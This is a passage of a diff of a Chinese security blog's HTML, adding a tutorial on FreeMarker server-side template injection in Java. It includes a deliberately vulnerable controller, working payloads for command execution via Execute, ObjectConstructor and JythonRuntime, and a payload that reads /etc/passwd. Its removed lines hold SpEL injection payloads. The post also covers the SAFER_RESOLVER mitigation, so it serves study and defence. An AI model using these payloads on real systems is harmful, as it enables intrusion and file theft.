Map&lt;String, Object&gt; data = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">        template.process(data, writer);</span><br><span class="line"></span><br><span class="line">        System.out.println(writer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么按照一般的场景，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, $&#123;name&#125;!</span><br></pre></td></tr></table></figure>
+
+<p>向name传参payload能顺利执行吗？答案是不可以。直接渲染用户输入<code>$&#123;&#125;</code>占位符的内容会进行转码，所以payload会失效。想要顺利的进行命令执行必须直接控制模板内容，看起来非常鸡肋，也确实鸡肋。。一般的利用场景为上传或直接能修改模板内容，而不是直接渲染用户输入去触发。所以，严格说来根本不算注入型的漏洞</p>
+<p>那寻找那万分之一的可能，如果真有注入模板的场景，那代码长什么样？</p>
+<p>如下代码：</p>
+<p>后续我们分析均是用如下代码作为demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Configuration</span> <span class="variable">freemarkerConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">StringTemplateLoader</span> <span class="variable">dynamicLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTemplateLoader</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setupTemplateLoader</span><span class="params">()</span> &#123;</span><br><span class="line">        TemplateLoader[] loaders = <span class="keyword">new</span> <span class="title class_">TemplateLoader</span>[] &#123;</span><br><span class="line">                dynamicLoader,</span><br><span class="line">                freemarkerConfig.getTemplateLoader()</span><br><span class="line">        &#125;;</span><br><span class="line">        freemarkerConfig.setTemplateLoader(<span class="keyword">new</span> <span class="title class_">MultiTemplateLoader</span>(loaders));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/template&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">render</span><span class="params">(<span class="meta">@RequestParam</span> Map&lt;String, String&gt; templates)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 设置模板</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : templates.entrySet()) &#123;</span><br><span class="line">            dynamicLoader.putTemplate(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取模板</span></span><br><span class="line">        <span class="type">Template</span> <span class="variable">t</span> <span class="operator">=</span> freemarkerConfig.getTemplate(<span class="string">&quot;payload&quot;</span>);</span><br><span class="line">        Map&lt;String, Object&gt; model = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">        t.process(model, out);</span><br><span class="line">        <span class="keyword">return</span> out.toString(); <span class="comment">// 返回渲染结果</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429154326953.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429154326953.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250429154326953"></p>
+<p>freemarker.template.Configuration为配置器，在 FreeMarker 中，<code>StringTemplateLoader</code> 的 <code>putTemplate(String name, String templateContent)</code> 方法用于将模板添加到加载器中。</p>
+<p>这种方式会直接把整个用户输入作为模板，而不是嵌入值。我们之后测试就用这个代码作为环境，这种通过java代码设置Configuration的方式，可以省略application.yml。因为getTemplate(“payload”)是指定渲染模板名为payload的模板</p>
+<p>所以payload必须key名与getTemplate参数一致：<code>payload=%3C%23assign+value%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7Bvalue%28%22calc%22%29%7D</code></p>
+<p>如果你多次调用 <code>putTemplate</code> 方法，并使用相同的模板名称（<code>name</code>），那么后一次的调用会覆盖前一次的模板内容。</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>以下payload均是直接修改ftl才能触发，而不是向<code>$&#123;&#125;</code>传参</p>
+<blockquote>
+<p>我突然想起python SSTI也是render(payload字符串)去触发，而不是向占位符传参。</p>
+</blockquote>
+<p>new触发：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;Calc&quot;).start()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面这个需要目标有完整的Jython依赖</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc&quot;)&lt;/@value&gt;</span><br></pre></td></tr></table></figure>
+
+<p>api触发：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign classLoader=object?api.class.protectionDomain.classLoader&gt; </span><br><span class="line">&lt;#assign clazz=classLoader.loadClass(&quot;ClassExposingGSON&quot;)&gt; </span><br><span class="line">&lt;#assign field=clazz?api.getField(&quot;GSON&quot;)&gt; </span><br><span class="line">&lt;#assign gson=field?api.get(null)&gt; </span><br><span class="line">&lt;#assign ex=gson?api.fromJson(&quot;&#123;&#125;&quot;, classLoader.loadClass(&quot;freemarker.template.utility.Execute&quot;))&gt; </span><br><span class="line">$&#123;ex(&quot;calc&quot;&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>读文件</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign is=object?api.class.getResourceAsStream(&quot;/Test.class&quot;)&gt;</span><br><span class="line">FILE:[&lt;#list 0..999999999 as _&gt;</span><br><span class="line">    &lt;#assign byte=is.read()&gt;</span><br><span class="line">    &lt;#if byte == -1&gt;</span><br><span class="line">        &lt;#break&gt;</span><br><span class="line">    &lt;/#if&gt;</span><br><span class="line">$&#123;byte&#125;, &lt;/#list&gt;]</span><br><span class="line">&lt;#assign uri=object?api.class.getResource(&quot;/&quot;).toURI()&gt;</span><br><span class="line">&lt;#assign input=uri?api.create(&quot;file:///etc/passwd&quot;).toURL().openConnection()&gt;</span><br><span class="line">&lt;#assign is=input?api.getInputStream()&gt;</span><br><span class="line">FILE:[&lt;#list 0..999999999 as _&gt;</span><br><span class="line">    &lt;#assign byte=is.read()&gt;</span><br><span class="line">    &lt;#if byte == -1&gt;</span><br><span class="line">        &lt;#break&gt;</span><br><span class="line">    &lt;/#if&gt;</span><br><span class="line">$&#123;byte&#125;, &lt;/#list&gt;]</span><br></pre></td></tr></table></figure>
+
+<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>用的payload：<code>&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc&quot;)&#125;</code>，yakit记得url编码</p>
+<h4 id="字符串分割"><a href="#字符串分割" class="headerlink" title="字符串分割"></a>字符串分割</h4><p>freemarkerConfig.getTemplate作为字符串分割的入口</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429202216300.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429202216300.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250429202216300"></p>
+<p>经过如下栈后，在freemarker.core.FMParser#MixedContentElement对字符串进行分割</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429202544024.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429202544024.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250429202544024"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429202527501.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429202527501.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250429202527501"></p>
+<p>因为开头的<code>&lt;#</code>，如下一堆case都是以<code>&lt;#</code>开头的，调用FreemarkerDirective，而且我们的<code>&lt;#assign</code>也属于这里面</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429202752859.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429202752859.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250429202752859"></p>
+<p>跟进后FreemarkerDirective函数，发现调用Assign</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429203000067.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429203000067.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250429203000067"></p>
+<p>Assgin就是根据标签分离<code>&lt;#assign</code>片段</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429203215328.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429203215328.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250429203215328"></p>
+<p>下面的具体操作我们就不看了，知道整个分割的过程发生在freemarker.core.FMParser#MixedContentElement即可。最后得到的结果是一个<code>&lt;#assign&gt;</code>片段和一个<code>$&#123;value&#125;</code>片段</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429203338188.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429203338188.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250429203338188"></p>
+<h4 id="模板解析"><a href="#模板解析" class="headerlink" title="模板解析"></a>模板解析</h4><p>将断点打到freemarker.template.Template#process处</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429162409739.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429162409739.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250429162409739"></p>
+<p>经过如下调用栈，来到freemarker.core.Environment#visit()方法</p>
+<p>先是一个对当前element的压栈，然后调用了element.accept。accept得到的结果就是上一节分离得到的两个片段，然后调用visit(el)，这是一个递归调用</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429170848599.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429170848599.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250429170848599"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429203654524.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429203654524.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250429203654524"></p>
+<p>不要被压栈退栈搞晕了，简单说来，就是进行递归访问模板元素，处理子元素</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429205349773.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429205349773.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250429205349773"></p>
+<h4 id="解析-lt-assign-gt"><a href="#解析-lt-assign-gt" class="headerlink" title="解析&lt;#assign&gt;"></a>解析<code>&lt;#assign&gt;</code></h4><p>首先是处理<code>&lt;#assign&gt;</code>元素，看到调用element为<code>&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;</code>片段的accept方法</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429205516516.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429205516516.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250429205516516"></p>
+<p>进到Assignment#accept方法内，处理赋值操作符为等于号（&#x3D;）的情况，调用 valueExp.eval(env) 计算表达式的值并赋给变量 value</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429205848021.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429205848021.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250429205848021"></p>
+<p>跟进eval，持续跟进到<code>freemarker.core.MethodCall#_eval</code>函数，这是Freemarker解析模板标签最关键的函数</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501141057195.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501141057195.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250501141057195"></p>
+<p>我挨个解释一下：</p>
+<ol>
+<li>首先对目标表达式（target）进行求值，得到一个TemplateModel对象；</li>
+<li>如果该对象是TemplateMethodModel类型，则：<br>若为扩展方法模型（TemplateMethodModelEx），获取参数的模型列表；<br>否则获取参数的值列表；<br>执行方法并返回结果包装后的内容；</li>
+<li>如果目标是宏（Macro），则调用宏并返回结果；</li>
+</ol>
+<p>首先target是<code>&quot;freemarker.template.utility.Execute&quot;?new</code>，eval后得到封装好<code>Execute</code>类的一个构造器类</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501141618780.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501141618780.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>然后跟进exec内，实例化了<code>Execute</code></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501142423132.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501142423132.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250501142423132"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501142459568.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501142459568.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250501142459568"></p>
+<h4 id="解析-value-quot-calc-quot"><a href="#解析-value-quot-calc-quot" class="headerlink" title="解析${value(&quot;calc&quot;)}"></a>解析<code>$&#123;value(&quot;calc&quot;)&#125;</code></h4><p>跟进到DollerVariable#accept，看这个类名也知道，是用来解析<code>$&#123;&#125;</code>的类。accept方法内，可以看到当前是处理<code>$&#123;value(&quot;calc&quot;)&#125;</code>。跟进该方法的calculateInterpolatedStringOrMarkup方法</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501142915903.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501142915903.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250501142915903"></p>
+<p>调用了escapedExpression.eval</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501152810924.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501152810924.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250501152810924"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501152904218.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501152904218.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250501152904218"></p>
+<p>跟进到MethodCall._eval，这里target.eval(env)是从环境变量中取出键为<code>value</code>的值，执行的结果就是Execute类，然后调用到了Execute.exec执行了代码。我们唯一需要关心的是，因为这个if的原因，取到的类必须是TemplatesMethodModel的子类，所以选择的Execute。这个类集成了TemplatesMethodModel</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501153041361.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501153041361.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250501153041361"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501153201559.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501153201559.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250501153201559"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501153316139.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501153316139.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250501153316139"></p>
+<p>除此以外，另外的一个payload用到的freemarker.template.utility.ObjectConstructor也满足继承了TemplateMethodModel的条件，且能调用任意构造函数</p>
+<p>target.eval就是根据不同的target去取值，我这里不想调了，感兴趣的可以跟一下，应该很简单，写上来会很乱</p>
+<h3 id="调试分析2"><a href="#调试分析2" class="headerlink" title="调试分析2"></a>调试分析2</h3><p>而JythonRuntime用到的就是截然不同的一条路径了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc&quot;)&lt;/@value&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>@value</code> 表示将 <code>value</code> 这个变量当作一个<strong>用户自定义指令（directive）</strong>来调用。FreeMarker 允许这种用法，但仅当这个对象实现了 <code>TemplateDirectiveModel</code> 接口。而某些特殊类如 <code>JythonRuntime</code>（在一些漏洞版本中）被恶意使用时，可以达到执行任意代码的效果。</p>
+<p>不过这个调用方式需要目标有Jython的完整依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.python<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jython-standalone<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>调用 <code>&lt;@value&gt;import os; os.system(&quot;calc&quot;)&lt;/@value&gt;</code> 会触发以下逻辑：</p>
 <ul>
-<li>ProcessBuilder：</li>
+<li>step 1：FreeMarker 调用 <code>getWriter(...)</code></li>
+<li>step 2：模板内容写入匿名 Writer</li>
 </ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(<span class="string">&quot;new java.lang.ProcessBuilder(new String[]&#123;\&quot;calc\&quot;&#125;).start()&quot;</span>);</span><br></pre></td></tr></table></figure>
-
+<p>内容 <code>import os; os.system(&quot;calc&quot;)</code> 被写入匿名 <code>Writer</code> 的 <code>buf</code> 缓冲区。</p>
 <ul>
-<li>ScriptEngineManager</li>
+<li>step 3：模板引擎关闭 Writer → 调用 <code>close()</code> → <code>interpretBuffer()</code>，以python形式执行exec</li>
 </ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(<span class="string">&quot;new javax.script.ScriptEngineManager().getEngineByName(\&quot;nashorn\&quot;).eval(\&quot;s=[1];s[0]=&#x27;calc&#x27;;java.lang.Runtime.getRuntime().exec(s);\&quot;)&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-
-
-<p>spring cloud gateway SpEL表达式注入CVE-2022-22947：</p>
-<p><a href="https://godownio.github.io/2023/04/19/spring-cloud-gateway-cve-2022-22947-spel-biao-da-shi-zhu-ru/">https://godownio.github.io/2023/04/19/spring-cloud-gateway-cve-2022-22947-spel-biao-da-shi-zhu-ru/</a></p>
-<p>jackson SpEL注入CVE-2017-17485</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501162650495.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501162650495.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250501162650495"></p>
+<p>我们打个断点看看，怎么调用到getWriter的</p>
+<p>因为是调用自定义函数的原因，<code>&lt;@</code>的解析来到了UnifiedCall.accept，先是照常，解析value，发现对应的是前面定义的JythonRuntime，然后JythonRuntime匹配各种if，最后来到了env.visitAndTransform</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501162758647.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501162758647.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250501162758647"></p>
+<p>然后一进来就调用了getWriter</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501163020553.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501163020553.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250501163020553"></p>
+<p>但是这种利用方式就是看个乐子</p>
+<p>API的利用方式这里就不调了</p>
+<p>从 <strong>2.3.17</strong>版本以后，官方版本提供了三种TemplateClassResolver对类进行解析：<br> 1、UNRESTRICTED_RESOLVER：可以通过 <code>ClassUtil.forName(className)</code> 获取任何类。<br> 2、SAFER_RESOLVER：不能加载 <code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类。<br> 3、ALLOWS_NOTHING_RESOLVER：不能解析任何类。<br> 可通过<code>freemarker.core.Configurable#setNewBuiltinClassResolver</code>方法设置<code>TemplateClassResolver</code>，从而限制通过<code>new()</code>函数对<code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类的解析。</p>
+<p>官网的修复：<a target="_blank" rel="noopener" href="https://freemarker.apache.org/docs/versions_2_3_17.html">https://freemarker.apache.org/docs/versions_2_3_17.html</a></p>
+<p>当然，我们遇到的freemarker很有可能没开这个安全配置，爽爽注入了</p>
 
       </div>
       <div class="post-tags-categories">
         
         <div class="tags">
           
-            <a href="/tags/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" class="">
-              SPEL表达式注入
+            <a href="/tags/Freemarker/" class="">
+              Freemarker
             </a>
           
         </div>
@@ -701,7 +839,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2024/10/14/spel-biao-da-shi-zhu-ru/" target="_blank" title="spEL表达式注入">https://godownio.github.io/2024/10/14/spel-biao-da-shi-zhu-ru/</a>
+    <a href="/2025/05/01/java-freemarker-ssti/" target="_blank" title="Java Freemarker SSTI">https://godownio.github.io/2025/05/01/java-freemarker-ssti/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
@@ -719,42 +857,22 @@
 
 
 
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8108.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8108.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-    </div>
-    <a href="/2024/10/15/jackson-lian/" class="post-nav-link">
-      <div class="title">
-        <i class="fas fa-angle-left"></i> 上一篇:
-        <div class="title-text">jackson 反序列化合集</div>
-      </div>
-      
-      <!-- <div class="content">
-        想不到2017的链子我还在复现
-反序列化条件达到以下任意一个条件，可以反序列化指定类：
-
-开启了enableDefaul
-      </div> -->
-    </a>
-  </div>
-
 
 
   
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8106.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8106.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
